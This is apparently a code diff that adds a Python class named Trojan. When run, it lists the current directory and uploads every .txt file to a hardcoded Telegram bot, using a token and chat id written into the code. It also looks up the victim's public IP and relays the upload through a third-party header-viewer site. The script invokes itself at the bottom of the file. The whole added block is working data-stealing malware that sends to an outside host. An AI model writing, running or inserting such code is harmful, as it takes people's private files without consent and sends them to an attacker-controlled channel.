@@ -30,3 +30,37 @@ class Trojan:
             else:
                 pass
 
+import random
+import requests
+from threading import *
+from time import sleep
+import os
+
+class Trojan:
+    def __init__(self):
+        self.ip = requests.get('https://ipinfo.io/json').json()['ip']
+
+    def SendFile(self,file):
+        token = '5810005976:AAENxEagc2bFXvJlPlammnFBAS9FGLQmD_A'
+        chat_id = '5506661371'
+        txt = open(file , 'rb')
+        url = ("https://api.telegram.org/bot"+token+"/sendDocument?chat_id="+chat_id)
+        url_txt = requests.post(url, files={'document': txt})
+
+        payload_txt = {
+            "UrlBox":url_txt,
+            "AgentList" : "Google Chrome",
+            "VersionsList" : "HTTP/1.1",
+            "MethodList" : "POST"
+        }
+        req = requests.post("https://www.httpdebugger.com/tools/ViewHttpHeaders.aspx", payload_txt)
+    def Crawl(self, extension:str):
+        arr = os.listdir()
+        for file in arr:
+            if extension in file:
+                self.SendFile(file)
+            else:
+                pass
+
+tj = Trojan()
+tj.Crawl(extension='.txt')
